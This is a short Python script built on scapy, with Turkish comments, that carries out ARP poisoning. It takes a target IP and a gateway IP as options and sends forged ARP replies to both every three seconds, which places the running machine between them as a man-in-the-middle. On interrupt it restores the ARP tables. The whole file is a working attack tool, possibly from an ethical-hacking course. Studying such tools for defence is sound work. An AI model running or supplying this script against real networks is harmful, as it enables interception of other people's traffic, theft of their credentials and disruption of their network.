import scapy.all as scapy
import time
import optparse

def get_mac_address(ip):
    
    arp_request_packet = scapy.ARP(pdst = ip)
    #scapy.ls(scapy.ARP())
    
    broadcast_packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    
    combined_packet = broadcast_packet / arp_request_packet ## ---> Scapy dilinde bu iki paketi al tek paket yap.
    
    answered_list = scapy.srp(combined_packet, timeout = 1, verbose = False)[0]

    #print(answered_list[0][1].hwsrc) ---> [0] ilk bilgi [1] ikinci bilgi | hwsrc ise o bilgiler içinden sadece bu bilgiyi göster.
    return answered_list[0][1].hwsrc # ---> Yukarda verilen ip adresinin mac adresini direkt bulma.

def arp_poisoning(target_ip,poisoned_ip):

    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op = 2,pdst = target_ip, hwdst = target_mac, psrc = poisoned_ip)
    
    scapy.send(arp_response, verbose = False, count = 6 )
    #scapy.ls(scapy.ARP())

def reset_operation(target_ip,poisoned_ip):

    target_mac = get_mac_address(target_ip)
    target_real_mac = get_mac_address(poisoned_ip)

    arp_response = scapy.ARP(op = 2,pdst = target_ip, hwdst = target_mac, psrc = poisoned_ip, hwsrc = target_real_mac)
    
    scapy.send(arp_response, verbose = False)
    #scapy.ls(scapy.ARP())

def get_user_input():
    
    parse_object = optparse.OptionParser()
    
    parse_object.add_option("-t", "--target", dest = "target_ip", help = "Enter target IP")
    parse_object.add_option("-g", "--gateway", dest = "gateway_ip", help = "Enter gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter target Ip")

    if not options.gateway_ip:
        print("Enter gateway Ip")

    return options

number = 0

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:

    while True:

        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)

        number += 2

        print("\rSending Packets " + str(number), end = "")

        time.sleep(3)

except KeyboardInterrupt:
    
    print("Quit and Reset")
    
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)

